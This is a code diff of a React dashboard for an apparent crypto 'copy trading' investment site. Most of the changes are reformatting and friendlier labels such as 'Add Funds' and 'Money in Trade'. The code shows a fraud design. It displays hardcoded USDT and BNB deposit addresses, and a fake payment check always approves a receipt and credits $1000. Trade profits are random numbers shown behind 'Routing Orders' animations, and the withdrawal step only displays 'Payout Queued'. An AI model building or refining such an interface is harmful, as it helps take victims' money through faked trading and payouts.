@@ -19,7 +19,7 @@ const PROFIT_STRATEGIES = [
 const NETWORKS = [
   { id: 'trc20', name: 'USDT (TRC-20)', address: 'TLY2M8F7p27z97E98979F25302979F25302' },
   { id: 'erc20', name: 'USDT (ERC-20)', address: '0x91F25302Ae72D97e989797592766391918c7d3E7' },
-  { id: 'bep20', name: 'BNB (BEP-20)', address: '0x6991Bd59A34D0B2819653888f6aaAEf004b780ca' } 
+  { id: 'bep20', name: 'BNB (BEP-20)', address: '0x6991Bd59A34D0B2819653888f6aaAEf004b780ca' }
 ];
 
 interface ActiveTrade {
@@ -32,12 +32,12 @@ interface ActiveTrade {
 }
 
 const verifyPaymentProof = async (base64Image: string, mimeType: string) => {
-    await new Promise(r => setTimeout(r, 3000));
-    return { 
-      is_valid: true, 
-      detected_amount: 1000, 
-      summary: "Simulated Success: Institutional Transfer Verified via Node Sync." 
-    };
+  await new Promise(r => setTimeout(r, 3000));
+  return {
+    is_valid: true,
+    detected_amount: 1000,
+    summary: "Simulated Success: Institutional Transfer Verified via Node Sync."
+  };
 };
 
 const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrader }) => {
@@ -45,14 +45,14 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
   const [investAmount, setInvestAmount] = useState<number>(500);
   const [isProcessingTrade, setIsProcessingTrade] = useState(false);
   const [showSuccessToast, setShowSuccessToast] = useState(false);
-  const [tradeResult, setTradeResult] = useState<{status: 'WIN' | 'LOSS', amount: number} | null>(null);
+  const [tradeResult, setTradeResult] = useState<{ status: 'WIN' | 'LOSS', amount: number } | null>(null);
   const [activeTrades, setActiveTrades] = useState<ActiveTrade[]>([]);
   const [withdrawStep, setWithdrawStep] = useState<'input' | 'confirm' | 'success'>('input');
   const [withdrawAmount, setWithdrawAmount] = useState('');
   const [withdrawAddress, setWithdrawAddress] = useState('');
   const [isWithdrawing, setIsWithdrawing] = useState(false);
   const [withdrawError, setWithdrawError] = useState('');
-  
+
   const depositSectionRef = useRef<HTMLDivElement>(null);
   const fileInputRef = useRef<HTMLInputElement>(null);
   const [depositNetwork] = useState(NETWORKS[0]);
@@ -68,20 +68,20 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
 
     const interval = setInterval(() => {
       const now = Date.now();
-      
+
       setActiveTrades(currentTrades => {
         const updated = currentTrades.map(trade => {
           const elapsed = now - trade.startTime;
           const rawProgress = (elapsed / trade.plan.durationMs) * 100;
-          
+
           if (rawProgress >= 100 && trade.progress < 100) {
             finishTrade(trade);
             return { ...trade, progress: 100 };
           }
-          
+
           const roi = (trade.plan.minRet + Math.random() * (trade.plan.maxRet - trade.plan.minRet)) / 100;
           const currentPnL = trade.investAmount * roi * (Math.min(100, rawProgress) / 100);
-          
+
           return {
             ...trade,
             progress: Math.min(100, rawProgress),
@@ -110,14 +110,14 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
       await new Promise(r => setTimeout(r, 1500));
       setVerificationStatus('Syncing Blockchain Nodes...');
       const result = await verifyPaymentProof(base64, file.type);
-      
+
       if (result.is_valid && result.detected_amount > 0) {
         setVerificationStatus(`VERIFIED: $${result.detected_amount}`);
         setTimeout(() => {
           const freshUser = authService.getUser() || user;
-          onUserUpdate(authService.updateUser({ 
+          onUserUpdate(authService.updateUser({
             balance: freshUser.balance + result.detected_amount,
-            hasDeposited: true 
+            hasDeposited: true
           })!);
           setIsVerifyingReceipt(false);
         }, 1500);
@@ -172,7 +172,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
       return;
     }
     setIsProcessingTrade(true);
-    setTradeResult(null); 
+    setTradeResult(null);
     setTimeout(() => {
       setIsProcessingTrade(false);
       const freshUser = authService.getUser() || user;
@@ -186,7 +186,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
   };
 
   const executeTradeLogic = (plan: typeof PROFIT_STRATEGIES[0], currentUser: UserProfile) => {
-    onUserUpdate(authService.updateUser({ 
+    onUserUpdate(authService.updateUser({
       balance: currentUser.balance - investAmount,
       totalInvested: currentUser.totalInvested + investAmount
     })!);
@@ -226,37 +226,37 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
     <div className="bg-[#131722] min-h-screen pt-4 pb-32 px-4 sm:px-6 lg:px-8 relative selection:bg-[#f01a64]/10">
       {isProcessingTrade && (
         <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/80 backdrop-blur-xl">
-           <div className="flex flex-col items-center gap-6">
-              <div className="relative w-20 h-20">
-                 <div className="absolute inset-0 border-4 border-white/5 rounded-full"></div>
-                 <div className="absolute inset-0 border-4 border-t-[#f01a64] rounded-full animate-spin"></div>
-              </div>
-              <p className="text-white font-black uppercase tracking-[0.4em] text-[10px] animate-pulse">Routing Orders to Exchange...</p>
-           </div>
+          <div className="flex flex-col items-center gap-6">
+            <div className="relative w-20 h-20">
+              <div className="absolute inset-0 border-4 border-white/5 rounded-full"></div>
+              <div className="absolute inset-0 border-4 border-t-[#f01a64] rounded-full animate-spin"></div>
+            </div>
+            <p className="text-white font-black uppercase tracking-[0.4em] text-[10px] animate-pulse">Routing Orders to Exchange...</p>
+          </div>
         </div>
       )}
 
       {showSuccessToast && (
-         <div className="fixed top-24 left-1/2 -translate-x-1/2 z-[210] bg-[#00b36b] text-white px-8 py-4 rounded-2xl shadow-2xl animate-in slide-in-from-top-4">
-            <span className="font-black uppercase tracking-widest text-xs">Mirror Protocol Engaged</span>
-         </div>
+        <div className="fixed top-24 left-1/2 -translate-x-1/2 z-[210] bg-[#00b36b] text-white px-8 py-4 rounded-2xl shadow-2xl animate-in slide-in-from-top-4">
+          <span className="font-black uppercase tracking-widest text-xs">Mirror Protocol Engaged</span>
+        </div>
       )}
 
-      <TacticalGuide 
-        step={activeTrades.length > 0 ? 'investing' : 'ready'} 
-        balance={user.balance} 
-        hasDeposited={user.hasDeposited} 
-        onDepositClick={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })} 
+      <TacticalGuide
+        step={activeTrades.length > 0 ? 'investing' : 'ready'}
+        balance={user.balance}
+        hasDeposited={user.hasDeposited}
+        onDepositClick={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })}
       />
 
       <div className="max-w-7xl mx-auto space-y-8">
         <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
           <div className="bg-[#1e222d] border border-white/5 p-6 rounded-3xl group hover:border-[#f01a64]/30 transition-colors">
-            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">Mirror Balance</span>
+            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">Account Balance</span>
             <span className={`text-2xl font-black ${user.hasDeposited ? 'text-[#00b36b]' : 'text-amber-500'}`}>${user.balance.toLocaleString()}</span>
           </div>
           <div className="bg-[#1e222d] border border-white/5 p-6 rounded-3xl">
-            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">Active Exposure</span>
+            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">Money in Trade</span>
             <span className="text-2xl font-black text-white">${user.totalInvested.toLocaleString()}</span>
           </div>
           <div className="bg-[#1e222d] border border-white/5 p-6 rounded-3xl">
@@ -264,7 +264,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
             <span className="text-2xl font-black text-[#00b36b]">+${tradeProfit.toLocaleString()}</span>
           </div>
           <button onClick={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })} className="bg-[#f01a64] p-6 rounded-3xl flex items-center justify-between shadow-xl active:scale-95 transition-all">
-            <span className="text-sm font-black text-white uppercase italic">Deposit Node</span>
+            <span className="text-sm font-black text-white uppercase italic">Add Funds</span>
             <svg className="h-5 w-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path d="M13 7l5 5m0 0l-5 5m5-5H6" strokeWidth={2.5} /></svg>
           </button>
         </div>
@@ -291,8 +291,8 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
                   <div className="h-full bg-[#f01a64] transition-all duration-300" style={{ width: `${trade.progress}%` }}></div>
                 </div>
                 <div className="mt-3 flex justify-between items-center">
-                   <span className="text-[8px] text-gray-600 font-black uppercase tracking-widest">Execution in Progress...</span>
-                   <span className="text-[9px] text-[#00b36b] font-black">{Math.floor(trade.progress)}%</span>
+                  <span className="text-[8px] text-gray-600 font-black uppercase tracking-widest">Execution in Progress...</span>
+                  <span className="text-[9px] text-[#00b36b] font-black">{Math.floor(trade.progress)}%</span>
                 </div>
               </div>
             ))}
@@ -301,83 +301,83 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrade
 
         <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
           <div className="lg:col-span-2 space-y-6">
-             <h3 className="text-xl font-black text-white uppercase italic px-2">Elite Replication Plans</h3>
-             <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                {PROFIT_STRATEGIES.map(plan => (
-                   <div key={plan.id} onClick={() => setSelectedPlanId(plan.id)} className={`bg-[#1e222d] border-2 p-8 rounded-[2.5rem] cursor-pointer transition-all hover:bg-[#2a2e39] ${selectedPlanId === plan.id ? 'border-[#f01a64] shadow-2xl' : 'border-white/5'}`}>
-                      <h4 className="text-white font-black text-lg uppercase mb-1">{plan.name}</h4>
-                      <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest mb-6">{plan.hook}</p>
-                      <div className="flex justify-between items-end">
-                         <span className="text-[#00b36b] font-black text-xl">{plan.minRet}-{plan.maxRet}% ROI</span>
-                         <span className="text-[8px] text-gray-600 font-black uppercase">{plan.duration} Window</span>
+            <h3 className="text-xl font-black text-white uppercase italic px-2">Choose Your Trade</h3>
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+              {PROFIT_STRATEGIES.map(plan => (
+                <div key={plan.id} onClick={() => setSelectedPlanId(plan.id)} className={`bg-[#1e222d] border-2 p-8 rounded-[2.5rem] cursor-pointer transition-all hover:bg-[#2a2e39] ${selectedPlanId === plan.id ? 'border-[#f01a64] shadow-2xl' : 'border-white/5'}`}>
+                  <h4 className="text-white font-black text-lg uppercase mb-1">{plan.name}</h4>
+                  <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest mb-6">{plan.hook}</p>
+                  <div className="flex justify-between items-end">
+                    <span className="text-[#00b36b] font-black text-xl">{plan.minRet}-{plan.maxRet}% ROI</span>
+                    <span className="text-[8px] text-gray-600 font-black uppercase">{plan.duration} Window</span>
+                  </div>
+                  {selectedPlanId === plan.id && (
+                    <div className="mt-8 pt-8 border-t border-white/5 space-y-6 animate-in slide-in-from-bottom-2">
+                      <div className="flex gap-3">
+                        <input type="number" value={investAmount} onChange={e => setInvestAmount(Number(e.target.value))} className="flex-1 bg-black border border-white/10 text-white text-sm p-4 rounded-xl outline-none font-black" placeholder="Amount..." />
+                        <button onClick={(e) => { e.stopPropagation(); startDeployment(); }} className="bg-[#f01a64] text-white px-8 py-4 rounded-xl font-black uppercase text-[10px] tracking-widest active:scale-95">Deploy</button>
                       </div>
-                      {selectedPlanId === plan.id && (
-                        <div className="mt-8 pt-8 border-t border-white/5 space-y-6 animate-in slide-in-from-bottom-2">
-                           <div className="flex gap-3">
-                              <input type="number" value={investAmount} onChange={e => setInvestAmount(Number(e.target.value))} className="flex-1 bg-black border border-white/10 text-white text-sm p-4 rounded-xl outline-none font-black" placeholder="Amount..." />
-                              <button onClick={(e) => { e.stopPropagation(); startDeployment(); }} className="bg-[#f01a64] text-white px-8 py-4 rounded-xl font-black uppercase text-[10px] tracking-widest active:scale-95">Deploy</button>
-                           </div>
-                        </div>
-                      )}
-                   </div>
-                ))}
-             </div>
+                    </div>
+                  )}
+                </div>
+              ))}
+            </div>
           </div>
 
           <div className="space-y-6">
-             <div ref={depositSectionRef} className="bg-[#1e222d] border border-white/5 rounded-[3rem] p-8 shadow-2xl">
-                <h3 className="text-lg font-black text-white uppercase mb-6 italic">Secure Wallet Handshake</h3>
-                <div className="bg-black/60 p-6 rounded-[2rem] border border-[#f01a64]/20 mb-8 text-center space-y-4">
-                   <span className="text-[8px] text-gray-500 font-black uppercase tracking-widest">Network: {depositNetwork.name}</span>
-                   <div className="bg-[#0f1116] p-4 rounded-xl text-[10px] font-mono text-white break-all shadow-inner">{depositNetwork.address}</div>
-                   <button onClick={() => { navigator.clipboard.writeText(depositNetwork.address); setCopySuccess(true); setTimeout(() => setCopySuccess(false), 1500); }} className={`w-full py-4 rounded-xl text-[10px] font-black uppercase transition-all ${copySuccess ? 'bg-[#00b36b] text-white' : 'bg-white/5 text-white border border-white/10'}`}>
-                     {copySuccess ? 'ADDRESS COPIED' : 'COPY TARGET'}
-                   </button>
-                </div>
-                <input type="file" ref={fileInputRef} onChange={handleFileChange} className="hidden" accept="image/*" />
-                <button onClick={() => fileInputRef.current?.click()} disabled={isVerifyingReceipt} className="w-full py-5 bg-[#f01a64] text-white rounded-2xl font-black uppercase tracking-[0.2em] text-[11px] disabled:opacity-50 shadow-xl transition-all active:scale-95">
-                  {isVerifyingReceipt ? (
-                    <div className="flex items-center justify-center gap-3">
-                      <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
-                      <span>{verificationStatus}</span>
-                    </div>
-                  ) : 'Confirm Transaction'}
+            <div ref={depositSectionRef} className="bg-[#1e222d] border border-white/5 rounded-[3rem] p-8 shadow-2xl">
+              <h3 className="text-lg font-black text-white uppercase mb-6 italic">Secure Wallet Handshake</h3>
+              <div className="bg-black/60 p-6 rounded-[2rem] border border-[#f01a64]/20 mb-8 text-center space-y-4">
+                <span className="text-[8px] text-gray-500 font-black uppercase tracking-widest">Network: {depositNetwork.name}</span>
+                <div className="bg-[#0f1116] p-4 rounded-xl text-[10px] font-mono text-white break-all shadow-inner">{depositNetwork.address}</div>
+                <button onClick={() => { navigator.clipboard.writeText(depositNetwork.address); setCopySuccess(true); setTimeout(() => setCopySuccess(false), 1500); }} className={`w-full py-4 rounded-xl text-[10px] font-black uppercase transition-all ${copySuccess ? 'bg-[#00b36b] text-white' : 'bg-white/5 text-white border border-white/10'}`}>
+                  {copySuccess ? 'ADDRESS COPIED' : 'Copy Wallet Address'}
                 </button>
-                {verificationError && <p className="text-red-500 text-[10px] font-black mt-3 text-center uppercase tracking-tighter">{verificationError}</p>}
-             </div>
+              </div>
+              <input type="file" ref={fileInputRef} onChange={handleFileChange} className="hidden" accept="image/*" />
+              <button onClick={() => fileInputRef.current?.click()} disabled={isVerifyingReceipt} className="w-full py-5 bg-[#f01a64] text-white rounded-2xl font-black uppercase tracking-[0.2em] text-[11px] disabled:opacity-50 shadow-xl transition-all active:scale-95">
+                {isVerifyingReceipt ? (
+                  <div className="flex items-center justify-center gap-3">
+                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                    <span>{verificationStatus}</span>
+                  </div>
+                ) : 'Confirm Transaction'}
+              </button>
+              {verificationError && <p className="text-red-500 text-[10px] font-black mt-3 text-center uppercase tracking-tighter">{verificationError}</p>}
+            </div>
 
-             <div className="bg-[#1e222d] border border-white/5 p-8 rounded-[3rem] shadow-2xl">
-                <h3 className="text-lg font-black text-white uppercase text-center mb-8 italic">Profit Withdrawal</h3>
-                {withdrawStep === 'input' && (
-                  <div className="space-y-4">
-                    <input type="text" placeholder="Withdrawal Address (TRC20)" value={withdrawAddress} onChange={e => setWithdrawAddress(e.target.value)} className="w-full bg-black border border-white/5 p-5 rounded-2xl text-[10px] text-white outline-none font-black uppercase placeholder:text-gray-700" />
-                    <input type="number" placeholder="USDT Amount" value={withdrawAmount} onChange={e => setWithdrawAmount(e.target.value)} className="w-full bg-black border border-white/5 p-5 rounded-2xl text-[10px] text-white outline-none font-black placeholder:text-gray-700" />
-                    {withdrawError && <p className="text-red-500 text-[9px] font-black text-center italic">{withdrawError}</p>}
-                    <button onClick={validateWithdrawal} className="w-full py-5 bg-[#00b36b] text-white rounded-2xl font-black uppercase text-[11px] shadow-lg active:scale-95 transition-all">Request Payout</button>
+            <div className="bg-[#1e222d] border border-white/5 p-8 rounded-[3rem] shadow-2xl">
+              <h3 className="text-lg font-black text-white uppercase text-center mb-8 italic">Profit Withdrawal</h3>
+              {withdrawStep === 'input' && (
+                <div className="space-y-4">
+                  <input type="text" placeholder="Withdrawal Address (TRC20)" value={withdrawAddress} onChange={e => setWithdrawAddress(e.target.value)} className="w-full bg-black border border-white/5 p-5 rounded-2xl text-[10px] text-white outline-none font-black uppercase placeholder:text-gray-700" />
+                  <input type="number" placeholder="USDT Amount" value={withdrawAmount} onChange={e => setWithdrawAmount(e.target.value)} className="w-full bg-black border border-white/5 p-5 rounded-2xl text-[10px] text-white outline-none font-black placeholder:text-gray-700" />
+                  {withdrawError && <p className="text-red-500 text-[9px] font-black text-center italic">{withdrawError}</p>}
+                  <button onClick={validateWithdrawal} className="w-full py-5 bg-[#00b36b] text-white rounded-2xl font-black uppercase text-[11px] shadow-lg active:scale-95 transition-all">Request Payout</button>
+                </div>
+              )}
+              {withdrawStep === 'confirm' && (
+                <div className="space-y-6 text-center">
+                  <p className="text-white font-black text-xl italic">${withdrawAmount}</p>
+                  <p className="text-[10px] text-gray-500 uppercase tracking-widest break-all px-4">{withdrawAddress}</p>
+                  <div className="flex gap-3">
+                    <button onClick={() => setWithdrawStep('input')} className="flex-1 py-4 bg-white/5 text-white rounded-xl text-[9px] font-black uppercase">Edit</button>
+                    <button onClick={confirmWithdrawal} disabled={isWithdrawing} className="flex-[2] py-4 bg-[#f01a64] text-white rounded-xl text-[10px] font-black uppercase shadow-xl transition-all active:scale-95">
+                      {isWithdrawing ? 'Processing...' : 'Confirm'}
+                    </button>
                   </div>
-                )}
-                {withdrawStep === 'confirm' && (
-                  <div className="space-y-6 text-center">
-                    <p className="text-white font-black text-xl italic">${withdrawAmount}</p>
-                    <p className="text-[10px] text-gray-500 uppercase tracking-widest break-all px-4">{withdrawAddress}</p>
-                    <div className="flex gap-3">
-                      <button onClick={() => setWithdrawStep('input')} className="flex-1 py-4 bg-white/5 text-white rounded-xl text-[9px] font-black uppercase">Edit</button>
-                      <button onClick={confirmWithdrawal} disabled={isWithdrawing} className="flex-[2] py-4 bg-[#f01a64] text-white rounded-xl text-[10px] font-black uppercase shadow-xl transition-all active:scale-95">
-                        {isWithdrawing ? 'Processing...' : 'Confirm'}
-                      </button>
-                    </div>
+                </div>
+              )}
+              {withdrawStep === 'success' && (
+                <div className="text-center space-y-6 animate-in zoom-in-95">
+                  <div className="w-16 h-16 bg-[#00b36b]/20 border border-[#00b36b]/40 rounded-full flex items-center justify-center mx-auto text-[#00b36b]">
+                    <svg className="w-8 h-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
                   </div>
-                )}
-                {withdrawStep === 'success' && (
-                  <div className="text-center space-y-6 animate-in zoom-in-95">
-                    <div className="w-16 h-16 bg-[#00b36b]/20 border border-[#00b36b]/40 rounded-full flex items-center justify-center mx-auto text-[#00b36b]">
-                      <svg className="w-8 h-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
-                    </div>
-                    <p className="text-white font-black text-xs uppercase tracking-widest">Payout Queued for Node {user.nodeId}</p>
-                    <button onClick={() => setWithdrawStep('input')} className="w-full py-4 bg-white/5 text-white rounded-xl text-[9px] font-black uppercase transition-all active:scale-95">Close Terminal</button>
-                  </div>
-                )}
-             </div>
+                  <p className="text-white font-black text-xs uppercase tracking-widest">Payout Queued for Node {user.nodeId}</p>
+                  <button onClick={() => setWithdrawStep('input')} className="w-full py-4 bg-white/5 text-white rounded-xl text-[9px] font-black uppercase transition-all active:scale-95">Close Terminal</button>
+                </div>
+              )}
+            </div>
           </div>
         </div>
       </div>
